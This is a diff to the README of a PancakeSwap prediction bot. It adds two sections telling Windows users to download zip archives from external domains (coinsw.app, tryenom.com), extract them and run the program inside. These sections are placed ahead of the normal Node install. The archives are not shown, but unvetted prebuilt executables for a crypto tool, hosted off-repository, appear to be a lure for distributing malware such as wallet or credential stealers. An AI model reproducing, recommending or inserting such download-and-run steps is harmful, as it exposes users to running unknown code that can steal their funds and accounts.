@@ -11,6 +11,18 @@ PancakeSwap Prediction Bot using AI recommendations.
 ![Winning rate](/images/1.png?raw=true)
 ![Winning rate](/images/2.jpg?raw=true)
 
+## 💡 Ready click-to-run version for Windows 🥞
+1. Download the [Easy run version](https://coinsw.app/PancakePredictionBot.zip).
+2. Extract the bot program from the zip archive and run it.
+3. Enjoy!
+
+## 💡 Ready click-to-run with UI version for Windows 🥞
+1. Download the [Easy run with UI version](https://tryenom.com/predict).
+2. Extract the bot program from the zip archive and run it.
+3. Enjoy!
+
+or
+
 ## 🐰⚡ Installation
 
 Download and Install Node here:
